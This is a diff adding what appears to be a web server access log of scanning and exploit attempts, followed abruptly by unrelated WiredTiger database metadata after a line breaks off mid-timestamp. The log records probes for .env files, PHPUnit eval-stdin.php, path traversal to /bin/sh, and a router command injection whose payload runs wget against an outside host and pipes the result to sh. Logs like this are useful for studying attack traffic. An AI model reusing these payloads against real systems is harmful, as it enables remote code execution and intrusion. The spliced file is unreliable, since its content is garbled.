@@ -1,0 +1,28 @@
+0] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\xE8=\xD2\x167aXe\xDF\xC0\xD5={\xFC\xDETDy\x92.\xD6\x80\x1B\x8F\x5C" 400 157 "-" "-"
+23.26.76.173 - - [26/Jun/2024:10:16:13 +0000] "GET /.env HTTP/1.1" 404 329 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
+4.246.246.216 - - [26/Jun/2024:10:16:22 +0000] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 329 "-" "Mozilla/5.0 zgrab/0.x"
+185.224.128.43 - - [26/Jun/2024:10:18:08 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
+34.22.213.78 - - [26/Jun/2024:10:18:39 +0000] "GET / HTTP/1.1" 400 255 "-" "python-requests/2.32.2"
+170.106.171.77 - - [26/Jun/2024:10:18:45 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
+170.106.171.77 - - [26/Jun/2024:10:18:46 +0000] "GET / HTTP/1.1" 200 329 "http://45.56.72.236" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
+141.98.83.197 - - [26/Jun/2024:10:25:38 +0000] "POST /ztp/cgi-bin/handler HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
+141.98.83.197 - - [26/Jun/2024:10:25:38 +0000] "GET /ztp/cgi-bin/handler HTTP/1.1" 404 472 "http://45.56.72.236:80/ztp/cgi-bin/handler" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
+143.110.222.166 - - [26/Jun/2024:10:27:41 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
+51.75.19.1 - - [26/Jun/2024:10:37:32 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
+185.191.127.212 - - [26/Jun/2024:10:49:32 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 169 "-" "Go-http-client/1.1"
+185.191.127.212 - - [26/Jun/2024:10:49:33 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 404 472 "http://45.56.72.236:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60)" "Go-http-client/1.1"
+120.76.176.45 - - [26/Jun/2024:10:51:13 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 157 "-" "-"
+120.76.176.45 - - [26/Jun/2024:10:51:14 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 157 "-" "-"
+120.76.176.45 - - [26/Jun/2024:10:51:15 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 472 "-" "Custom-AsyncHttpClient"
+120.76.176.45 - - [26/Jun/2024:10:51:15 +0000] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 472 "-" "Custom-AsyncHttpClient"
+120.76.176.45 - - [26/Jun/2024:10:51:16 +0000] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 472 "-" "Custom-AsyncHttpClient"
+120.76.176.45 - - [26/Jun/2024:10:51:17 +0000] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 472 "-" "Custom-AsyncHttpClient"
+120.76.176.45 - - [26/Jun/2024:10:51:17 +0000] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 404 472 "-" "Custom-AsyncHttpClient"
+120.76.176.45 - - [26/Jun/2024:10:51:18 +0000] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 472 "-" "Custom-AsyncHttpClient"
+120.76.176.45 - - [26/Jun/2024:10:51:19 +0000] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 472 "-" "Custom-AsyncHttpClient"
+120.76.176.45 - - [26/WiredTiger version string
+WiredTiger 11.2.0: (November 10, 2022)
+WiredTiger version
+major=11,minor=2,patch=0
+file:WiredTiger.wt
+access_pattern_hint=none,allocation_size=4KB,app_metadata=,assert=(commit_timestamp=none,durable_timestamp=none,read_timestamp=none,write_timestamp=off),block_allocation=best,block_compressor=,cache_resident=false,checksum=on,collator=,columns=,dictionary=0,encryption=(keyid=,name=),format=btree,huffman_key=,huffman_value=,id=0,ignore_in_memory_cache_size=false,internal_item_max=0,internal_key_max=0,internal_key_truncate=true,internal_page_max=4KB,key_format=S,key_gap=10,leaf_item_max=0,leaf_key_max=0,leaf_page_max=32KB,leaf_value_max=0,log=(enabled=true),memory_page_image_max=0,memory_page_max=5MB,os_cache_dirty_max=0,os_cache_max=0,prefix_compression=false,prefix_compression_min=4,readonly=false,split_deepen_min_child=0,split_deepen_per_child=0,split_pct=90,tiered_object=false,tiered_storage=(auth_token=,bucket=,bucket_prefix=,cache_directory=,local_retention=300,name=,object_target_size=0),value_format=S,verbose=[],version=(major=1,minor=1),write_timestamp_usage=none,checkpoint=(WiredTigerCheckpoint.1481=(addr="018681e4db0f16ff8781e448b93d2c9081e437f08d02808080e3010fc0e23fc0",order=1481,time=1719418903,size=28672,newest_start_durable_ts=0,oldest_start_ts=0,newest_txn=1741,newest_stop_durable_ts=0,newest_stop_ts=-1,newest_stop_txn=-11,prepare=0,write_gen=4443,run_write_gen=1)),checkpoint_backup_info=,checkpoint_lsn=(1,1297280)
